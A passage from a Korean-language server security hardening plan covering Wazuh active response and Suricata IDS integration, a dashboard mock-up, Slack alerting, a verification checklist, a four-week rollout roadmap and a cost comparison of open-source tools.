</active-response>

<active-response>
  <!-- 크립토 마이너 감지 → 자동 프로세스 킬 -->
  <command>kill-process</command>
  <location>local</location>
  <rules_id>100210,100211</rules_id>
</active-response>
```

#### Step 5: Suricata 연동 (선택사항)

```bash
# 네트워크 레벨 IDS가 필요한 경우 Suricata 추가
apt install -y suricata

# Suricata → Wazuh 연동
# /etc/suricata/suricata.yaml의 eve.json을
# Wazuh가 읽도록 설정

# /var/ossec/etc/ossec.conf에 추가:
<localfile>
  <log_format>json</log_format>
  <location>/var/log/suricata/eve.json</location>
</localfile>
```

Suricata가 감지하는 네트워크 위협:
```
• 마이닝 풀 연결 (Stratum 프로토콜)
• 리버스 쉘 트래픽 (비정상 outbound)
• C2 비컨 패턴 (주기적 heartbeat)
• SQL Injection 시도
• 알려진 악성 IP 통신
• DDoS 패턴
```

### 4.7 대시보드 및 알림

```
Wazuh Dashboard에서 볼 수 있는 것:

┌─────────────────────────────────────────────────────────────┐
│  Wazuh Security Dashboard                                    │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│  서버 상태              보안 이벤트 (최근 24시간)            │
│  ┌─────────────────┐   ┌─────────────────────────────┐      │
│  │ App     [●] OK  │   │ Critical: 0                 │      │
│  │ Stream  [●] OK  │   │ High:     2                 │      │
│  │ Storage [●] OK  │   │ Medium:   15                │      │
│  │ Backup  [●] OK  │   │ Low:      142               │      │
│  └─────────────────┘   └─────────────────────────────┘      │
│                                                              │
│  파일 무결성              취약점                              │
│  ┌─────────────────┐   ┌─────────────────────────────┐      │
│  │ 변경: 3         │   │ CVE-2024-xxxx: bcryptjs     │      │
│  │ 추가: 1         │   │ CVE-2024-yyyy: node 20.x    │      │
│  │ 삭제: 0         │   │ Total: 12 (5 Critical)      │      │
│  └─────────────────┘   └─────────────────────────────┘      │
│                                                              │
│  실시간 로그 스트림                                          │
│  ┌─────────────────────────────────────────────────────┐    │
│  │ 23:01 [App] SSH login from 10.10.0.4 (Backup)      │    │
│  │ 23:02 [Storage] PostgreSQL connection from 10.10.0.1│    │
│  │ 23:03 [App] Docker container started: myapp-green   │    │
│  │ 23:04 [Stream] Centrifugo WebSocket peak: 150 conn  │    │
│  └─────────────────────────────────────────────────────┘    │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

알림 통합:
```bash
# Slack 웹훅 연동
# /var/ossec/etc/ossec.conf
<integration>
  <name>slack</name>
  <hook_url>https://hooks.slack.com/services/xxx/yyy/zzz</hook_url>
  <level>12</level>    <!-- HIGH 이상만 Slack 알림 -->
  <alert_format>json</alert_format>
</integration>
```

### 4.8 검증 체크리스트

```
[ ] Wazuh Manager All-in-one 설치 (141 서버)
[ ] Dashboard 접속 확인 (https://141.164.60.51)
[ ] Agent 설치 (App, Streaming, Storage, Backup)
[ ] 모든 Agent 연결 상태 확인
[ ] FIM(파일 무결성) /tmp, /var/tmp 모니터링 설정
[ ] 크립토 마이너 커스텀 탐지 규칙 추가
[ ] 리버스 쉘 커스텀 탐지 규칙 추가
[ ] Active Response 테스트 (SSH 브루트포스 차단)
[ ] Slack/메일 알림 연동
[ ] 공격 시뮬레이션 → 탐지 확인
[ ] Suricata 연동 (선택)
[ ] 대시보드 커스텀 뷰 설정
```

---

## 5. 실행 우선순위 및 일정

```
┌─────────────────────────────────────────────────────────────┐
│                     실행 로드맵                               │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│  Week 1: WireGuard VPN                                       │
│  ├─ Day 1-2: 141 서버 설치 + App 서버 연동 테스트           │
│  ├─ Day 3-4: Storage 서버 DB를 VPN만 바인딩                 │
│  └─ Day 5: 전체 메시 구성 + 성능 테스트                     │
│                                                              │
│  Week 2: 컨테이너 보안 강화                                  │
│  ├─ Day 1: 현재 컨테이너 보안 감사                           │
│  ├─ Day 2-3: Seccomp 프로파일 + read-only 테스트            │
│  ├─ Day 4: 공격 시뮬레이션으로 검증                          │
│  └─ Day 5: 프로덕션 적용 계획 수립                          │
│                                                              │
│  Week 3: IDS/SIEM (Wazuh)                                    │
│  ├─ Day 1-2: Wazuh Manager 설치 (141 서버)                  │
│  ├─ Day 3: Agent 배포 (4대 서버)                             │
│  ├─ Day 4: 커스텀 규칙 + Active Response 설정               │
│  └─ Day 5: 알림 연동 + 공격 시뮬레이션 테스트               │
│                                                              │
│  Week 4: DR 파이프라인                                       │
│  ├─ Day 1-2: 백업 자동화 (WAL, RDB, rclone)                │
│  ├─ Day 3: 복원 스크립트 작성 + 141 서버에서 테스트         │
│  ├─ Day 4: DNS 전환 시뮬레이션                               │
│  └─ Day 5: 전체 DR 드릴 실행 + RTO 측정                    │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

### 의존성 관계

```
WireGuard VPN ─────→ (선행 조건) ─────→ DB VPN 바인딩
       │                                      │
       └──→ Wazuh Agent 통신 보안 ←────────────┘
                     │
                     ▼
              DR 파이프라인 (VPN + 모니터링 완비 후)
```

---

## 6. 비용 분석

```
모든 도구가 오픈소스 — 추가 비용 $0

┌──────────────────┬──────────┬──────────────────────┐
│ 도구              │ 비용     │ 대안 (상용)          │
├──────────────────┼──────────┼──────────────────────┤
│ WireGuard        │ 무료     │ Tailscale ($5/user)  │
│ Wazuh            │ 무료     │ Splunk ($150/GB/day) │
│ Suricata         │ 무료     │ Palo Alto ($10k+)    │
│ Trivy            │ 무료     │ Snyk ($25/dev/mo)    │
│ pg_basebackup    │ 무료     │ Barman (무료도 가능) │
│ rclone           │ 무료     │ Veeam ($$$)          │
├──────────────────┼──────────┼──────────────────────┤
│ 합계             │ $0       │ $10,000+/year        │
└──────────────────┴──────────┴──────────────────────┘

유일한 비용: 141 서버 호스팅비 (이미 운영 중)
```

---

*Document generated: 2026-02-10*
*Target server: 141.164.60.51 (Ubuntu 22.04, 15GB RAM)*
*All tools: Open Source, $0 cost*
